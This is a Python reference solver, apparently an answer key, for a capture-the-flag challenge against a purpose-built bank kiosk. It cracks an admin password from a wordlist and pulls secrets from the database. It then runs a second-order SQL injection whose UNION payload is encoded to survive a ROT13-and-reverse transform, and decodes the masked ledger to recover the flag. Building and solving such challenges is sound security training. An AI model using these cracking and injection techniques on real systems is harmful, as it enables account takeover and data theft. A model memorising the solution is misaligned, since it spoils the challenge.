#!/usr/bin/env python3
"""M01 reference solver (participant-reproducible).

Drives the real kiosk binary -- nothing is hard-coded except the layer recipe:

1. Read fleeca.db to pull the DB-bound secrets: the server pepper, the session
   secret and the destination ledger name (config.core_ledger).
2. Crack the honeypot admin's weak password from the leaked wordlist against
   the custom hash (per-user salt + pepper + reversed username).
3. Authenticate via `login` so a valid HMAC session token exists (gate A).
4. Register a username carrying an SQLi payload, `sync` it so the *derived*
   alias is the value actually stored, then `load` it. A single-stage
   register+load does nothing; the two stored operations are mandatory.
5. The alias is passed through a legacy write-side transform (ROT13 then
   reverse) that the read path does NOT undo, so the injected value must be
   COMPOSED as the inverse transform to survive the round-trip (gate B).
6. The stored alias is interpolated raw into the vault query, so the union
   reaches the real ledger. Querying the decoy `escrow` ledger instead trips a
   canary that poisons the session, so the correct ledger name matters.
7. Every real-ledger column is stored base64-encoded AND XOR-masked with a key
   derived from the session HMAC secret (gate C); the participant must hold a
   valid session and unmask each column to read the flag.
"""
import base64
import hashlib
import hmac
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, r"d:\ctf\FLAG_THEFT_AUTO_FINAL\rebuild_workspace")
import lib_fta as L

SRC = L.out_dir("M01")
HASH_TAG = "fleeca-h2"
VEIL_TAG = "M01-escrow-veil"
HONEYPOT_USER = "admin"


def custom_hash(password: str, username: str, salt: str, pepper: str) -> str:
    material = f"{HASH_TAG}|{salt}|{password}|{username[::-1]}|{pepper}"
    return hashlib.sha256(material.encode()).hexdigest()[:20]


def _rot13(text: str) -> str:
    return text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))


def _unmangle(text: str) -> str:
    """Inverse of the kiosk write-side display transform (ROT13 then reverse)."""
    return _rot13(text[::-1])


def _keystream(key: bytes, tag: str, length: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(key + tag.encode() + counter.to_bytes(4, "big")).digest()
        counter += 1
    return out[:length]


def _veil_key(session_key_hex: str) -> bytes:
    return hmac.new(bytes.fromhex(session_key_hex), VEIL_TAG.encode(), hashlib.sha256).digest()


def _unveil(blob: str, tag: str, session_key_hex: str) -> str:
    raw = base64.b64decode(blob[3:])
    ks = _keystream(_veil_key(session_key_hex), tag, len(raw))
    return bytes(a ^ b for a, b in zip(raw, ks)).decode()


def _db_secrets(db: Path):
    con = sqlite3.connect(db)
    cfg = dict(con.execute("SELECT key, value FROM config").fetchall())
    row = con.execute(
        "SELECT pw_salt, pw_hash FROM users WHERE username = ?", (HONEYPOT_USER,)
    ).fetchone()
    con.close()
    assert row, "honeypot account missing from fleeca.db"
    return cfg, row[0], row[1]


def _recover_password(pw_hash: str, salt: str, pepper: str, words) -> str:
    for word in words:
        if custom_hash(word, HONEYPOT_USER, salt, pepper) == pw_hash:
            return word
    raise AssertionError("admin password not found in common_pw.txt")


def _new_work() -> Path:
    """Throwaway copy so the shipped artifacts stay pristine."""
    work = Path(tempfile.mkdtemp(prefix="m01_"))
    for name in ("fleeca.db", "fleeca_kiosk.py"):
        shutil.copy(SRC / name, work / name)
    return work


def _kiosk(work: Path, *args) -> str:
    r = subprocess.run(
        [sys.executable, str(work / "fleeca_kiosk.py"), *args],
        capture_output=True, text=True,
    )
    return r.stdout


def _admin_login(work: Path, cfg) -> None:
    words = (SRC / "common_pw.txt").read_text(encoding="utf-8").split()
    _cfg, salt, admin_hash = _db_secrets(work / "fleeca.db")
    admin_pw = _recover_password(admin_hash, salt, cfg["server_pepper"], words)
    assert "welcome back" in _kiosk(work, "login", HONEYPOT_USER, admin_pw), "auth layer not solved"


def solve() -> str:
    work = _new_work()
    try:
        cfg, _salt, _h = _db_secrets(work / "fleeca.db")
        session_key = cfg["session_key"]
        ledger = cfg["core_ledger"]              # destination table name (DB-driven)
        _admin_login(work, cfg)

        # Stage 1: store the payload username (parameterized).
        # Stage 2: `sync` stores the derived alias (the only value load trusts).
        # Stage 3: `load` interpolates the alias raw -> union into the real ledger.
        # The payload must be composed as the inverse of the write-side display
        # transform so the stored alias round-trips back to real SQL.
        desired = f"x' UNION SELECT owner, secret FROM {ledger} WHERE '1'='1"
        payload = _unmangle(desired)
        _kiosk(work, "register", payload, "x")
        # A single-stage register+load must NOT reach the vault.
        assert "alias not synced" in _kiosk(work, "load", payload), "single-stage payload unexpectedly worked"
        _kiosk(work, "sync", payload)
        out = _kiosk(work, "load", payload)
        m = re.search(r"FTA\{[a-z0-9_]+\}", out)
        assert m, f"no flag leaked; kiosk output:\n{out}"
        flag = m.group(0)

        # Layer 2 (independent check): unmask the veiled ledger columns ourselves.
        con = sqlite3.connect(work / "fleeca.db")
        rows = con.execute(f"SELECT owner, secret FROM {ledger}").fetchall()
        con.close()
        unveiled = [_unveil(secret, "secret", session_key) for _owner, secret in rows]
        assert flag in unveiled, "veiled ledger did not unmask to the flag"
        return flag
    finally:
        shutil.rmtree(work, ignore_errors=True)


def naive_attempt() -> str:
    """Register the raw payload WITHOUT composing it through the write-side
    transform: the stored alias is scrambled and the injection never fires."""
    work = _new_work()
    try:
        cfg, _salt, _h = _db_secrets(work / "fleeca.db")
        _admin_login(work, cfg)
        desired = f"x' UNION SELECT owner, secret FROM {cfg['core_ledger']} WHERE '1'='1"
        _kiosk(work, "register", desired, "x")
        _kiosk(work, "sync", desired)
        return _kiosk(work, "load", desired)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def canary_attempt() -> str:
    """Hit the obvious-but-wrong decoy ledger: serves decoy data and poisons
    the teller session."""
    work = _new_work()
    try:
        cfg, _salt, _h = _db_secrets(work / "fleeca.db")
        _admin_login(work, cfg)
        desired = "x' UNION SELECT owner, secret FROM escrow WHERE '1'='1"
        payload = _unmangle(desired)
        _kiosk(work, "register", payload, "x")
        _kiosk(work, "sync", payload)
        return _kiosk(work, "load", payload)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def check(candidate: str) -> None:
    assert candidate == L.FLAGS["M01"], f"wrong flag rejected: {candidate!r}"


if __name__ == "__main__":
    flag = solve()
    check(flag)
    print("[M01] PASS ->", flag)
